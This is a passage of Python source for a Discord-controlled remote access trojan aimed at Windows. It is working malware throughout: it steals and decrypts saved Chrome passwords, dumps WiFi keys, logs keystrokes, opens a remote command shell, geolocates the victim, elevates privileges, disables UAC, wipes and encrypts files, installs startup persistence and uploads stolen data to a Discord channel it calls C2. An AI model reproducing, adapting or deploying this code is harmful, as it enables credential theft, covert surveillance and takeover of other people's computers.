                        shortcut_path = startup_folder / f'{startupName}.bat'

                        if os.path.exists(str(shortcut_path)):
                            os.remove(str(shortcut_path))



                    USER_DATA_PATH, LOCAL_STATE_PATH = f"{os.environ['USERPROFILE']}\\AppData\\Local\\Google\\Chrome\\User Data", f"{os.environ['USERPROFILE']}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
                    TEMP_DB = f"{os.environ['TEMP']}\\justforfun.db"

                    @bot.command()
                    async def passwords_chrome(ctx):
                        if ctx.channel == created_channel and ctx.message.content == "!passwords_chrome":
                            await ctx.send("Grabbing passwords...")
                            print("Chrome Password Decryptor by bytemafia")
                            file_location = os.path.join(os.getcwd(), "passwords.csv") # Full file path
                            with open(file_location, mode='w', newline='') as passfile: # Write file
                                writer = csv.writer(passfile, delimiter=',')
                                writer.writerow(["No      <->      URL      <->      Username      <->      Password"])
                                secret_key = secretKey()
                                default_folders = ("Profile", "Default")
                                data_folders = [data_path for data_path in os.listdir(USER_DATA_PATH) if data_path.startswith(default_folders)]
                                for data_folder in data_folders:
                                    db_path = f"{USER_DATA_PATH}\\{data_folder}\\Login Data" # Chrome db
                                    con = login_db(db_path)
                                if secret_key and con:
                                    cur = con.cursor()
                                    cur.execute("select action_url, username_value, password_value from logins")
                                    for index, data in enumerate(cur.fetchall()):
                                        url = data[0]
                                        username = data[1]
                                        ciphertext = data[2]
                                        if url != "" and username != "" and ciphertext != "": # To only collect valid entries
                                            password = password_decrypt(secret_key, ciphertext)
                                            writer.writerow([index, url, username, password])
                                    print("Completed! File is at: " + file_location)
                                    con.close()
                                    os.remove(TEMP_DB)

                            # Uploading the file to the Discord server channel
                            with open(file_location, 'rb') as file:
                                file = discord.File(file)
                                await ctx.send("Here are the Chrome passwords:", file=file)

                            # Remove the file after uploading
                            os.remove(file_location)

                    # Collecting secret key
                    def secretKey():
                        try:
                            with open(LOCAL_STATE_PATH, "r") as f:
                                local_state = f.read()
                                key_text = json.loads(local_state)["os_crypt"]["encrypted_key"]
                            key_buffer = base64.b64decode(key_text)[5:]
                            key = win32crypt.CryptUnprotectData(key_buffer)[1]
                            return key
                        except Exception as e:
                            print(e)

                    # Login to db where creds are stored
                    def login_db(db_path):
                        try:
                            shutil.copy(db_path, TEMP_DB) # Copy to temp dir, otherwise get permission error
                            sql_connection = sqlite3.connect(TEMP_DB)
                            return sql_connection
                        except Exception as e:
                            print(e)

                    # Decrypt the password
                    def password_decrypt(secret_key, ciphertext):
                        try:
                            iv = ciphertext[3:15]
                            password_hash = ciphertext[15:-16]
                            cipher = AES.new(secret_key, AES.MODE_GCM, iv)
                            password = cipher.decrypt(password_hash).decode()
                            return password
                        except Exception as e:
                            print(e)

                    @bot.command()
                    async def interactive_cmd(ctx):
                        if ctx.channel == created_channel and ctx.message.content == "!interactive_cmd":
                            # Check if the command was sent in a text channel and matches the command trigger
                            initial_directory = "C:/Users"  # Replace with your actual directory path
                            await ctx.send(f"Interactive command prompt started in {initial_directory}. Type `exit` to exit.")

                            # Start a subprocess for the command prompt
                            process = subprocess.Popen(
                                ['cmd'],
                                stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                shell=True,
                                cwd=initial_directory  # Set the initial directory
                            )

                            # Read and discard the initial copyright message
                            while True:
                                output_line = process.stdout.readline().decode('latin-1').strip()
                                if not output_line or output_line.endswith(initial_directory + ">"):
                                    break

                            async def read_output():
                                while True:
                                    output_line = process.stdout.readline().decode('latin-1').strip()
                                    if not output_line or output_line.endswith(initial_directory + ">"):
                                        break
                                    await ctx.send(f"```\n{output_line}\n```")

                            try:
                                while True:
                                    user_input = await bot.wait_for('message', check=lambda message: message.channel == created_channel)
                                    if user_input.content.lower() == 'exit':
                                        await ctx.send("Interactive command prompt ended.")
                                        break

                                    # Send user's input to the command prompt
                                    process.stdin.write(f"{user_input.content}\n".encode())
                                    process.stdin.flush()

                                    # Read the output of the previous command
                                    await read_output()

                            except Exception as e:
                                await ctx.send(f"An error occurred: {e}")

                            process.terminate()

                    @bot.command()
                    async def geolocate(ctx):
                        if ctx.channel == created_channel and ctx.message.content == "!geolocate":
                            await ctx.send("Calculating position...")
                            gmaps = googlemaps.Client(GOOGLE_API_KEY)
                            loc = gmaps.geolocate()
                            latitude = loc['location']['lat']
                            longitude = loc['location']['lng']
                            accuracy_radius = loc['accuracy']  # Get the accuracy radius

                            google_maps_link = f"https://maps.google.com/maps?q={latitude},{longitude}"
                            await ctx.send(f"Google Maps Link: {google_maps_link}")
                            await ctx.send(f"Accuracy Radius: {accuracy_radius} meters")

                    @bot.command()
                    async def messagebox(ctx, type, title, message):
                        if ctx.channel == created_channel:
                            try:
                                if not type or not title or not message:
                                    await ctx.send("Please make sure you use the following syntax:\n!messagebox [type] [title] [message]")
                                else:
                                    if type == "error":
                                        await ctx.send("Messagebox sent **sucessfully**")
                                        mb.showerror(title, message)

                                    elif type == "info":
                                        await ctx.send("Messagebox sent **sucessfully**")
                                        mb.showinfo(title, message)

                                    elif type == "warning":
                                        await ctx.send("Messagebox sent **sucessfully**")
                                        mb.showwarning(title, message)

                            except Exception as e:
                                await ctx.send(f"An error ocurred when showing messagebox:\n{e}")

                    # Network stealer
                    @bot.command()
                    async def network(ctx):
                        if ctx.channel == created_channel and ctx.message.content == "!network":
                            await ctx.send("Loading WiFi SSIDs and passwords...")
                            nameListString = ""
                            networkNames = subprocess.check_output("netsh wlan show profile", shell=True, text=True)
                            networkNamesLines = networkNames.splitlines()
                            for line in networkNamesLines:
                                line.strip()
                                if ':' in line:
                                    start = line.index(':') +1
                                    name = str(line[start:].strip())
                                    if len(name) > 1:
                                        try:
                                            checkInfo = f"netsh wlan show profile name=\"{name}\" key=clear"
                                            nameInfo = subprocess.check_output(checkInfo, shell=True, text=True)
                                            nameInfo = nameInfo.splitlines()
                                        except subprocess.CalledProcessError:
                                            continue
                                        password = "[!] Not Found!"
                                        for i in nameInfo:
                                            if "Key Content" in i:
                                                start = i.index(":") +1
                                                password = i[start:].strip()
                                        nameListString += "\t\t" + name + "\t:\t" + password + "\n"
                            await ctx.send(f"**Saved Networks [NAME : PASSWORD]**:\n\n {nameListString}")

                    def secure_delete_file(path_to_file):
                        # Securely delete a file by setting its data to zero.
                        CallME('fsutil.exe file setZeroData offset=0 length=9999999999 "' + path_to_file + '"')
                        os.remove(path_to_file)

                    @bot.command()
                    async def securefile(ctx, path):
                        if ctx.channel == created_channel:
                            if not path:
                                await ctx.send("Please provide path to file (!securefile <path-to-file>).")
                                return
                            try:
                                secure_delete_file(path)
                                await ctx.send("Successfully fucked file!")
                                await ctx.message.add_reaction("\U0001F4A5")  # boom emoji
                            except FileNotFoundError as fnfe:
                                await ctx.send("The specified file was not found (" + str(fnfe) + ")")
                                return

                    @bot.command()
                    async def sendkey(ctx, Key):
                        if ctx.channel == created_channel:
                            if not Key:
                                await ctx.send("Please provide keys to be pressed (!SendKey <Hello-World\{ENTER\}>).")
                                return

                            await ctx.send("Creating .VBS script")

                            # Change all "-" to " "
                            Key = Key.replace("-", " ")

                            # Create new .vbs script to send key
                            script_path = r'C:\users\public\key.vbs'
                            with open(script_path, 'w') as f:
                                f.write('Set WshShell = WScript.CreateObject("WScript.Shell")\n')
                                f.write(f'WshShell.SendKeys "{Key}"\n')

                            # Execute .vbs script
                            await ctx.send("Executing Script!")
                            CallME(f'cscript "{script_path}"')

                            await ctx.send("Sent key: " + Key)
                            await ctx.send("Removing Script...")
                            os.remove(script_path)
                            await ctx.send("Script removed!")


                    # Create a variable to store the logged keys
                    logged_keys = []

                    # Define a global variable for the listener and is_logging
                    listener = None
                    is_logging = False

                    # Define keys that should trigger a new line
                    new_line_keys = set([keyboard.Key.shift_r, keyboard.Key.backspace])

                    def on_key_press(key):
                        global is_logging
                        if is_logging:
                            try:
                                # Check if the key is a modifier key and skip logging if it is
                                if isinstance(key, keyboard.KeyCode):
                                    logged_key = key.char
                                else:
                                    logged_key = f"[{str(key)}]"

                                if key in new_line_keys:
                                    logged_keys.append("\n")  # Start a new line
                                logged_keys.append(f"Key: {logged_key} ")
                            except AttributeError:
                                if key == keyboard.Key.space:
                                    logged_key = " "
                                else:
                                    logged_key = f"[{str(key)}]"

                                if key in new_line_keys:
                                    logged_keys.append("\n")  # Start a new line
                                logged_keys.append(f"Key: {logged_key} ")

                    def start_logging():
                        global listener, is_logging
                        logged_keys.clear()  # Clear previously logged keys
                        listener = keyboard.Listener(on_press=on_key_press)
                        listener.start()
                        is_logging = True
                        print("Logging started...")

                    def stop_logging():
                        global listener, is_logging
                        if listener:
                            listener.stop()
                            with open("keylog.txt", "w") as logfile:
                                logfile.write(" ".join(logged_keys))
                            is_logging = False
                            print("Logging stopped. Keys saved to 'keylog.txt'")

                    @bot.command()
                    async def startlog(ctx):
                        if ctx.channel == created_channel:
                            global is_logging
                            if is_logging:
                                await ctx.send("Logging is already started. Use **!dumplog** to see logs.")
                            else:
                                start_logging()
                                await ctx.send("Logging started. Use **!dumplog** to see logs.")

                    @bot.command()
                    async def stoplog(ctx):
                        if ctx.channel == created_channel:
                            global is_logging
                            if is_logging:
                                stop_logging()
                                await ctx.send("Logging stopped. Use **!dumplog** to see logs.")
                            else:
                                await ctx.send("Logging is already stopped. Use **!dumplog** to see logs.")

                    @bot.command()
                    async def dumplog(ctx):
                        if ctx.channel == created_channel:
                            global logged_keys
                            if logged_keys:
                                # Save the logged keys to a text file
                                with open("keylog.txt", "w") as logfile:
                                    logfile.write("".join(logged_keys))

                                # Send the log file as an attachment
                                await ctx.send("Here is the log:", file=discord.File("keylog.txt"))

                                # Delete the temporary log file
                                os.remove("keylog.txt")
                            else:
                                await ctx.send("No keys have been logged yet.")

                    @bot.command()
                    async def restart(ctx):
                        global created_channel
                        if ctx.channel == created_channel:

                            await ctx.send("Restarting...")

                            # Determine the script filename dynamically
                            script_filename = sys.argv[0]

                            # Build the command to run the script with arguments
                            script_command = [sys.executable, script_filename]

                            # Start a new process to run the script
                            subprocess.Popen(script_command)

                            # Delete channel
                            if created_channel:
                                await created_channel.delete()

                            # Exit the current script
                            sys.exit()


                    def installNirsoft(zip_file_url, exe_file_name):
                        # Destination path for the downloaded .zip file
                        zip_download_path = r"C:\\Users\\Public\\archive.zip"

                        # Directory where you want to extract the .exe file
                        extraction_directory = r"C:\\Users\\Public"

                        # Check if the .zip file already exists, and if not, download it
                        if not os.path.exists(zip_download_path):
                            try:
                                # Download the .zip file
                                response = requests.get(zip_file_url)
                                with open(zip_download_path, 'wb') as file:
                                    file.write(response.content)
                                print(f".zip File downloaded to {zip_download_path}")
                            except Exception as e:
                                print(f".zip File download failed: {str(e)}")

                        # Extract the .exe file from the .zip archive
                        try:
                            with zipfile.ZipFile(zip_download_path, 'r') as zip_ref:
                                # Check if the .exe file exists in the archive
                                if exe_file_name in zip_ref.namelist():
                                    zip_ref.extract(exe_file_name, extraction_directory)
                                    exe_path = os.path.join(extraction_directory, exe_file_name)
                                    print(f".exe File extracted to {exe_path}")
                                else:
                                    print(f".exe file '{exe_file_name}' not found in the archive.")
                        except Exception as e:
                            print(f"Extraction of .exe file failed: {str(e)}")

                    def program_isInstalled(full_path_to_exe):
                        return os.path.exists(full_path_to_exe)


                    @bot.command()
                    async def history(ctx):
                        if ctx.channel == created_channel:
                            # URL of the .zip file to download
                            zip_file_url = "https://www.nirsoft.net/utils/browsinghistoryview.zip"

                            # Destination path for the downloaded .zip file
                            zip_download_path = r"C:\\Users\\Public\\archive.zip"

                            # Directory where you want to extract the .exe file
                            extraction_directory = r"C:\\Users\\Public"

                            # Command to execute after extracting the .exe file
                            command_to_execute = r'C:\Users\Public\BrowsingHistoryView.exe /HistorySource 1 /LoadChrome 1 /shtml "C:\Users\Public\history.html"'

                            # Delete the files that were created by the previous command
                            # Check if any of the files (.html, .zip, .exe) exists
                            if (os.path.exists(extraction_directory + "\\history.html") or os.path.exists(zip_download_path) or os.path.exists(extraction_directory + "\\BrowsingHistoryView.exe")):
                                # Delete the files
                                # Check if history.html exists
                                if os.path.exists(extraction_directory + "\\history.html"):
                                    os.remove(extraction_directory + "\\history.html")
                                # Check if the .zip file exists
                                if os.path.exists(zip_download_path):
                                    os.remove(zip_download_path)
                                # Check if the .exe file exists
                                if os.path.exists(extraction_directory + "\\BrowsingHistoryView.exe"):
                                    os.remove(extraction_directory + "\\BrowsingHistoryView.exe")
                                print(".zip, .html, and .exe files deleted from last execution.")
                                await ctx.send(f".zip, .html, and .exe files deleted from last execution.")
                            else:
                                print("No files to delete from last command.")
                                await ctx.send("No files to delete from last command.")

                            # Check if the .zip file already exists, and if not, download it
                            if not os.path.exists(zip_download_path):
                                try:
                                    # Download the .zip file
                                    response = requests.get(zip_file_url)
                                    with open(zip_download_path, 'wb') as file:
                                        file.write(response.content)
                                    await ctx.send(f".zip File downloaded to {zip_download_path}")
                                    print(f".zip File downloaded to {zip_download_path}")
                                except Exception as e:
                                    await ctx.send(f".zip File download failed: {str(e)}")
                                    print(f".zip File download failed: {str(e)}")

                            # Extract the .exe file from the .zip archive
                            try:
                                with zipfile.ZipFile(zip_download_path, 'r') as zip_ref:
                                    # Specify the name of the .exe file you want to extract
                                    exe_file_name = "BrowsingHistoryView.exe"

                                    # Check if the .exe file exists in the archive
                                    if exe_file_name in zip_ref.namelist():
                                        zip_ref.extract(exe_file_name, extraction_directory)
                                        exe_path = os.path.join(extraction_directory, exe_file_name)
                                        await ctx.send(f".exe File extracted to {exe_path}")
                                        print(f".exe File extracted to {exe_path}")
                                    else:
                                        await ctx.send(f".exe file '{exe_file_name}' not found in the archive.")
                                        print(f".exe file '{exe_file_name}' not found in the archive.")
                            except Exception as e:
                                await ctx.send(f"Extraction of .exe file failed: {str(e)}")
                                print(f"Extraction of .exe file failed: {str(e)}")

                            # Execute the command using the extracted .exe file
                            try:
                                subprocess.run(command_to_execute, shell=True, cwd=extraction_directory)
                                success_message = "Command executed successfully."
                                print(success_message)
                                await ctx.send(success_message)

                                # Send file to C2
                                await ctx.send("Sent file to C2", file=discord.File(extraction_directory + "\\history.html"))

                                # Delete the archive (.zip) and the extracted .exe file
                                os.remove(extraction_directory + "\\history.html")
                                os.remove(zip_download_path)
                                os.remove(extraction_directory + "\\BrowsingHistoryView.exe")
                                print(".zip, .html, and .exe files deleted.")
                                await ctx.send(".zip, .html, and .exe files deleted.")
                            except Exception as e:
                                error_message = f"Command execution failed: {str(e)}"
                                print(error_message)
                                await ctx.send("Error: " + error_message)

                    @bot.command()
                    async def volume(ctx, volume_amount):
                        if ctx.channel == created_channel:
                            try:
                                volume_amount = int(volume_amount)  # Convert the input to an integer

                                if program_isInstalled("C:\\Users\\Public\\nircmd.exe"):
                                    await ctx.send(f"NirCMD is installed and ready!")

                                    if (0 <= volume_amount <= 100):
                                        # Calculate from percentage to NirCMD volume (1% being 655)
                                        volume_level = volume_amount * 655

                                        try:
                                            command = f"C:\\Users\\Public\\nircmd.exe setsysvolume {volume_level}"  # Update the path here
                                            os.system(command)
                                            await ctx.send(f"Volume changed to {volume_amount}%.")
                                            await ctx.send(f"Removing NirCMD...")
                                            if (os.path.exists("C:\\Users\\Public\\nircmd.exe")):
                                                os.remove("C:\\Users\\Public\\nircmd.exe")
                                            if (os.path.exists("C:\\users\\public\\archive.zip")):
                                                os.remove("C:\\users\\public\\archive.zip")
                                            await ctx.send(f"NirCMD removed!")
                                        except Exception as e:
                                            await ctx.send(f"An error occurred while changing the volume: {e}")
                                    else:
                                        await ctx.send("Volume amount must be between 0 and 100.")
                                else:
                                    await ctx.send("NirCMD is not installed, installing it now!")

                                    # Install NirCMD om man inte har det
                                    installNirsoft("https://www.nirsoft.net/utils/nircmd.zip", "nircmd.exe")

                                    await ctx.send("NirCMD has been installed.")
                                    if (0 <= volume_amount <= 100):
                                        # Calculate from procentage to NirCMD volume (1% being 655)
                                        volume_level = volume_amount * 655

                                        try:
                                            command = f"C:\\Users\\Public\\nircmd.exe setsysvolume {volume_level}"  # Update the path here
                                            os.system(command)
                                            await ctx.send(f"Volume changed to {volume_amount}%.")
                                            await ctx.send(f"Removing NirCMD...")
                                            if (os.path.exists("C:\\Users\\Public\\nircmd.exe")):
                                                os.remove("C:\\Users\\Public\\nircmd.exe")
                                            if (os.path.exists("C:\\users\\public\\archive.zip")):
                                                os.remove("C:\\users\\public\\archive.zip")
                                            await ctx.send(f"NirCMD removed!")
                                        except Exception as e:
                                            await ctx.send(f"An error occurred while changing the volume: {e}")
                                    else:
                                        await ctx.send("Volume amount must be between 0 and 100.")
                            except ValueError:
                                await ctx.send("Invalid volume amount. Please provide a number between 0 and 100.")
                            except Exception as e:
                                await ctx.send(f"An error occurred: {e}")

                    @bot.command()
                    async def install(ctx):
                        if ctx.channel == created_channel and ctx.message.content == '!install':
                            print("Received !install command")
                            await ctx.send("Installing the bot on startup...")

                            try:
                                # Check if the operating system is Windows
                                if platform.system() == "Windows":
                                    print("Operating system is Windows")
                                    await ctx.send("Client is using Windows...")

                                    script_path = os.path.abspath(__file__)
                                    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")

                                    try:
                                        if running_as_executable:
                                            await ctx.send("Client has the **.exe** extension on payload.")
                                            # If the script is an executable
                                            executable_path = sys.executable
                                            executable_link_path = os.path.join(startup_folder, "DiscordBOT.exe")
                                            shutil.copy2(executable_path, executable_link_path)
                                            print(f"Executable copied to: {executable_link_path}")
                                        else:
                                            # If the script is a .py file
                                            if script_path.endswith('.py'):
                                                await ctx.send("Client has the **.py** extension on payload.")
                                                # Create a duplicate copy of the script in C:\Users\Public\PythonScripts
                                                public_folder = os.path.join(os.environ["PUBLIC"], "PythonScripts")
                                                os.makedirs(public_folder, exist_ok=True)
                                                await ctx.send("Created PythonScripts directory at **" + public_folder + "**")
                                                duplicate_script_path = os.path.join(public_folder, "DiscordBOT_duplicate.py")
                                                shutil.copy2(script_path, duplicate_script_path)
                                                await ctx.send("Copied .py file from **" + script_path + "** to **" + duplicate_script_path + "**")

                                                # Create a batch script to run the duplicate .py script
                                                batch_script_path = os.path.join(startup_folder, "DiscordBOT.bat")
                                                batch_script_content = f'@echo off\n"{sys.executable}" "{duplicate_script_path}"'
                                                with open(batch_script_path, 'w') as batch_file:
                                                    batch_file.write(batch_script_content)
                                                print(f"Batch script created at: {batch_script_path}")
                                                await ctx.send(f"Batch script created at: **{batch_script_path}**")
                                            elif script_path.endswith('.pyw'):
                                                await ctx.send("Client has the **.pyw** extension on payload.")
                                                # Create a duplicate copy of the script in C:\Users\Public\PythonScripts
                                                public_folder = os.path.join(os.environ["PUBLIC"], "PythonScripts")
                                                os.makedirs(public_folder, exist_ok=True)
                                                await ctx.send("Created PythonScripts directory at **" + public_folder + "**")
                                                duplicate_script_path = os.path.join(public_folder, "DiscordBOT_duplicate.pyw")
                                                shutil.copy2(script_path, duplicate_script_path)
                                                await ctx.send("Copied .pyw file from **" + script_path + "** to **" + duplicate_script_path + "**")

                                                # Create a batch script to run the duplicate .py script
                                                batch_script_path = os.path.join(startup_folder, "DiscordBOT.bat")
                                                batch_script_content = f'@echo off\n"{sys.executable}" "{duplicate_script_path}"'
                                                with open(batch_script_path, 'w') as batch_file:
                                                    batch_file.write(batch_script_content)
                                                print(f"Batch script created at: {batch_script_path}")
                                                await ctx.send(f"Batch script created at: **{batch_script_path}**")
                                            else:
                                                await ctx.send("Client has the **.exe** extension on payload.")
                                                # If the script is an .exe file
                                                exe_link_path = os.path.join(startup_folder, "DiscordBOT.exe")
                                                shutil.copy2(script_path, exe_link_path)
                                                print(f"Executable copied to: **{exe_link_path}**")

                                        await ctx.send("Bot installed on startup!")
                                        print("Bot installed on startup!")
                                    except Exception as copy_error:
                                        await ctx.send(f"An error occurred while copying the script: {copy_error}")
                                        print(f"An error occurred while copying the script: {copy_error}")
                                else:
                                    await ctx.send("This feature is only supported on Windows.")
                                    print("This feature is only supported on Windows.")
                            except Exception as os_error:
                                await ctx.send(f"An error occurred while checking the operating system: {os_error}")
                                print(f"An error occurred while checking the operating system: {os_error}")

                    @bot.command()
                    async def uninstall(ctx):
                        if ctx.channel == created_channel and ctx.message.content == '!uninstall':
                            print("Received !uninstall command")
                            await ctx.send("Uninstalling the bot...")

                            try:
                                # Check if the operating system is Windows
                                if platform.system() == "Windows":
                                    print("Operating system is Windows")
                                    await ctx.send("Client is using Windows")

                                    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                                    batch_script_path = os.path.join(startup_folder, "DiscordBOT.bat")
                                    exe_link_path = os.path.join(startup_folder, "DiscordBOT.exe")

                                    # Remove the batch script and executable link
                                    if os.path.exists(batch_script_path):
                                        secure_delete_file(batch_script_path)
                                        print(f"Batch script removed: {batch_script_path}")
                                        await ctx.send(f"Batch script removed: **{batch_script_path}**")
                                    if os.path.exists(exe_link_path):
                                        secure_delete_file(exe_link_path)
                                        print(f"Executable link removed: {exe_link_path}")
                                        await ctx.send(f"Executable link removed: **{exe_link_path}**")

                                    # Display a message indicating that persistence has been removed
                                    await ctx.send("Bot persistence removed!")
                                    print("Bot persistence removed!")
                                else:
                                    await ctx.send("This feature is only supported on Windows.")
                                    print("This feature is only supported on Windows.")
                            except Exception as e:
                                await ctx.send(f"An error occurred while uninstalling: {e}")
                                print(f"An error occurred while uninstalling: {e}")

                    @bot.command()
                    async def elevate(ctx):
                        if ctx.channel == created_channel:
                            if is_admin():
                                await ctx.send("User has administrative privileges.")
                            else:
                                return await ctx.send(elevate_privileges())

                    @bot.command()
                    async def cat(ctx, file_name):
                        if ctx.channel == created_channel:
                            try:
                                with open(file_name, 'r') as file:
                                    file_content = file.read()
                                    await ctx.send(f"Content of '{file_name}':\n```\n{file_content}\n```")
                            except Exception as e:
                                await ctx.send(f"An error occurred while reading the file: {e}")

                    @bot.command()
                    async def upload(ctx):
                        if ctx.channel == created_channel and ctx.message.attachments:
                            attachment = ctx.message.attachments[0]
                            await attachment.save(attachment.filename)
                            await ctx.send(f"File '{attachment.filename}' uploaded successfully.")
                        elif not ctx.messege.attachments:
                            await ctx.send(f"File did not upload, you did not attach any files...")

                    # Function to generate a Fernet key from a password
                    def generate_key_from_password(password, salt=None):
                        if salt is None:
                            salt = os.urandom(16)
                        kdf = PBKDF2HMAC(
                            algorithm=hashes.SHA256(),
                            iterations=100000,  # You can adjust the number of iterations as needed
                            salt=salt,
                            length=32  # Length of the derived key
                        )
                        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
                        return key, salt

                    # Function to encrypt a file
                    def encrypt_file(input_file, password):
                        try:
                            key, salt = generate_key_from_password(password)
                            fernet = Fernet(key)

                            with open(input_file, 'rb') as file:
                                file_data = file.read()

                            encrypted_data = fernet.encrypt(file_data)

                            # Use the same filename for the encrypted file
                            with open(input_file, 'wb') as encrypted_file:
                                encrypted_file.write(salt + encrypted_data)

                            return input_file  # Return the updated input file name
                        except InvalidToken:
                            return "Invalid token (key or password)"

                    # Function to decrypt a file
                    def decrypt_file(input_file, password):
                        try:
                            with open(input_file, 'rb') as encrypted_file:
                                salt = encrypted_file.read(16)  # Read the salt
                                encrypted_data = encrypted_file.read()

                            key, _ = generate_key_from_password(password, salt)  # Reconstruct the key

                            fernet = Fernet(key)
                            decrypted_data = fernet.decrypt(encrypted_data)

                            # Use the same filename for the decrypted file
                            with open(input_file, 'wb') as decrypted_file:
                                decrypted_file.write(decrypted_data)

                            return input_file  # Return the updated input file name
                        except InvalidToken:
                            return "Invalid token (key or password)"

                    @bot.command()
                    async def encrypt(ctx, input_file, password):
                        if ctx.channel == created_channel:
                            encrypted_file_name = encrypt_file(input_file, password)
                            await ctx.send(f'File encrypted and saved as {encrypted_file_name}')
                            return encrypted_file_name

                    @bot.command()
                    async def decrypt(ctx, input_file, password):
                        if ctx.channel == created_channel:
                            decrypted_file_name = decrypt_file(input_file, password)
                            if decrypted_file_name != "Invalid token (key or password)":
                                await ctx.send(f'File decrypted and saved as {decrypted_file_name}')
                            else:
                                await ctx.send(decrypted_file_name)

                    def has_persistence():
                        # Check if the bot has persistence using either the .py or .exe method
                        script_path = os.path.abspath(__file__)
                        startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                        batch_script_path = os.path.join(startup_folder, "DiscordBOT.bat")
                        exe_link_path = os.path.join(startup_folder, "DiscordBOT.exe")

                        return os.path.exists(batch_script_path) or os.path.exists(exe_link_path) or script_path.endswith('.exe')

                    def has_better_persistence():
                        if Path(f"C:\\users\\public\\{publicFileName}.pyw").exists():
                            print("Noted: Client has the .pyw file in Public directory.")
                            # Check if the client has persistence using all methods (registry, task scheduler, startup folder) 
                            persistence_results = CheckBetterPersistence(script_path)

                            # Check if all persistence mechanisms are detected
                            return all(persistence_results.values())
                        else:
                            print("Client does not have persistence. (Specifically, does not have the .pyw file in Public directory)")
                            return False

                    def get_system_info():
                        try:
                            script_path = os.path.abspath(sys.argv[0])
                            info = []
                            info.append(f"System: {platform.system()}")
                            info.append(f"Node Name: {platform.node()}")
                            info.append(f"Release: {platform.release()}")
                            info.append(f"Version: {platform.version()}")
                            info.append(f"Machine: {platform.machine()}")
                            info.append(f"Processor: {platform.processor()}")

                            # Memory information
                            memory = psutil.virtual_memory()
                            info.append(f"Memory Total: {convert_bytes(memory.total)}")
                            info.append(f"Memory Available: {convert_bytes(memory.available)}")
                            info.append(f"Memory Used: {convert_bytes(memory.used)} ({memory.percent}%)")

                            # Disk information
                            partitions = psutil.disk_partitions()
                            for partition in partitions:
                                partition_usage = psutil.disk_usage(partition.mountpoint)
                                info.append(f"Disk {partition.device} ({partition.mountpoint}):")
                                info.append(f"  Total: {convert_bytes(partition_usage.total)}")
                                info.append(f"  Used: {convert_bytes(partition_usage.used)} ({partition_usage.percent}%)")

                            # Additional system information
                            info.append(f"Username: {os.getlogin()}")
                            info.append(f"Device Name: {platform.node()}")
                            info.append(f"IsAdmin: {is_admin()}")
                            # Check if the bot has installed persistence (.py or .exe)
                            info.append(f"Has Persistence (Reg): {check_registry_persistence(script_path)}")
                            info.append(f"Has Persistence (Task): {check_task_scheduler_persistence(script_path)}")
                            info.append(f"Has Persistence (Startup): {check_startup_persistence(script_path)}")

                            private_ip = socket.gethostbyname(socket.gethostname())
                            info.append(f"Private IP: {private_ip}")
                            info.append(f"Public IP: {GetPublicIP()}")
                            info.append(f"Keylogger Activated: {is_logging}")

                            return '\n'.join(info)
                        except Exception as e:
                            return f"An error occurred while fetching system information: {e}"

                    def convert_bytes(bytes_value):
                        # Convert bytes to human-readable format
                        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
                            if bytes_value < 1024:
                                return f"{bytes_value:.2f} {unit}"
                            bytes_value /= 1024
                        return f"{bytes_value:.2f} PB"

                    def GetPublicIP():
                        ip_address = requests.get('https://httpbin.org/ip').json()['origin'] # Get public IP address
                        return ip_address

                    def GetLocalIP():
                        private_ip = socket.gethostbyname(socket.gethostname())
                        return private_ip

                    def CallME(argument):
                        try:
                            result = subprocess.run(argument, shell=True, text=True, capture_output=True)
                            if result.returncode == 0:
                                return result.stdout
                            else:
                                return f"Command exited with status code {result.returncode}.\n{result.stderr}"
                        except Exception as e:
                            return f"An error occurred: {e}"

                    async def DownloadFile(file_name, channel):
                        try:
                            with open(file_name, 'rb') as file:
                                file_content = file.read()
                                file_message = await channel.send(file=discord.File(io.BytesIO(file_content), filename=file_name))
                                await channel.send(f"File '{file_name}' uploaded and available for download.")
                        except Exception as e:
                            await channel.send(f"An error occurred while uploading the file: {e}")

                    # check and ask for elevation
                    # Function for trying to run the script elevated
                    def elevate_privileges():
                        try:
                            admin_pass = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                            if admin_pass > 32:
                                return "Success! You should recive a new connection with a Elevated Client." and os._exit(0)
                            else:
                                return "User pressed \"No\". Privilege elevation not successful"
                        except Exception as e:
                            return f"Failed to elevate privileges: {e}"

                    # Function for getting if user is elevated or not
                    def is_admin():
                        try:
                            # Check if the current process has administrative privileges
                            return ctypes.windll.shell32.IsUserAnAdmin() != 0
                        except:
                            return False


                    # ------------------------------------------------------------
                    #
                    #                    SETTINGS STARTS HERE
                    #
                    # ------------------------------------------------------------

                    # The part that runs on start, asking for elevation.
                    if askForUACOnStart:
                        if is_admin():
                            print("User has administrative privileges already...")
                        else:
                            print("User does not have administrative privileges. Requesting it now!")
                            elevate_privileges()
                    else:
                        print("Does not try to ask for UAC on start")

                    # Disable uac on start or not...
                    if disableUACOnStart:
                        print("Trying to disable UAC on start...")
                        try:
                            # Check if the operating system is Windows
                            if platform.system() == "Windows":
                                print("Operating system is Windows")

                                # Check if the client has administrative privileges
                                if is_admin():
                                    print("User has administrative privileges.")
                                    try:
                                        # Disable UAC
                                        CallME('powershell.exe Set-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name EnableLUA -Value 0')
                                        print("UAC disabled!")
                                    except Exception as e:
                                        print(f"An error occurred while disabling UAC: {e}")
                                else:
                                    print("User does not have administrative privileges.")
                            else:
                                print("This feature is only supported on Windows.")
                        except Exception as os_error:
                            print(f"An error occurred while checking the operating system: {os_error}")
                    else:
                        print("Does not disable UAC on start!")

                    # Try to install on start or not..
                    if installOnStart:
                        if has_better_persistence():
                            print("Client already has persistence, there is no need to install again.")
                        else:
                            print("Trying to install on start...")
                            try:
                                # Check if the operating system is Windows
                                if platform.system() == "Windows":
                                    print("Operating system is Windows")

                                    # Check if the cloned script is in the public directory
                                    public_directory = Path('C:/Users/Public')
                                    copied_script_path = public_directory / (publicFileName + ".pyw")
                                    if (Path(script_path) != copied_script_path):
